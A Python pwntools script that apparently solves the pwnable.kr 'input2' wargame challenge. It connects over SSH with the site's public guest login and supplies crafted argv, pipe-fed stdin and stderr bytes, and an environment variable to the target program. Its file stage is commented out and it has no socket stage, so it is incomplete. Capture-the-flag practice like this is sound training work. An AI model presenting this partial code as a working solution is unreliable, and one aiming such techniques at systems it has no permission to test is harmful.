#!/usr/bin/env python3
import os
from pwn import *
import uuid

"""
STAGE1:
parameter1 is at argv['A'] = argv[0x41]
its value can be anything but 0
parameter2 is at argv['B'] = argv[0x42]
its value is "\x20\x0a\x0d"
"""

def stage1():
  args = ["a" for i in range(100)]
  args[0] = '/home/input2/input'
  args[ord('A')] = '\x00'
  args[ord('B')] = "\x20\x0a\x0d"
  return args

"""
STAGE2:
reads 4 bytes from stdin
compares them to \x00\x0a\x00\xff
reads 4 bytes from stderr
compares thee to \x00\x0a\x02\xff

"""

def stage2():
  check1 = b"\x00\x0a\x00\xff"
  check2 = b"\x00\x0a\x02\xff"
  r_stdin, w_stdin = os.pipe()
  w_stdin = os.fdopen(w_stdin, 'wb')
  w_stdin.write(check1)
  w_stdin.close()
  r_stderr, w_stderr = os.pipe()
  w_stderr = os.fdopen(w_stderr, 'wb')
  w_stderr.write(check2)
  return r_stdin, r_stderr

def stage3():
  return {"\xde\xad\xbe\xef":"\xde\xad\xbe\xef"}

def stage4(ssh_tunnel):
  # dir_name = str(uuid.uuid1())
  dir_name = "b8666c20-6e8e-11ec-bfae-66c326de0d59"
  #print(f"random dirname is: {dir_name}")
  #ssh_tunnel.system(f"mkdir /tmp/{dir_name}")
  #ssh_tunnel.system(f"python -c \"print '\\x00'*4\" | /tmp/{dir_name}/\x0a")
  return dir_name

def main(user, host, port, password):
  ssh_tunnel = ssh(user, host, port, password)
  args = stage1()
  sol_stdin, sol_stderr = stage2()
  sol_env = stage3()
  sol_dir = stage4(ssh_tunnel)

  io = ssh_tunnel.process(args, cwd=f"/tmp/{sol_dir}", env=sol_env, stdin=sol_stdin, stderr=sol_stderr)
  res = io.recv()
  print(res.decode())
  res = io.recv()
  print(res.decode())
  res = io.recv()
  print(res.decode())
  res = io.recv()
  print(res.decode())






if __name__ == "__main__":
  main("input2", "pwnable.kr", 2222, "guest")
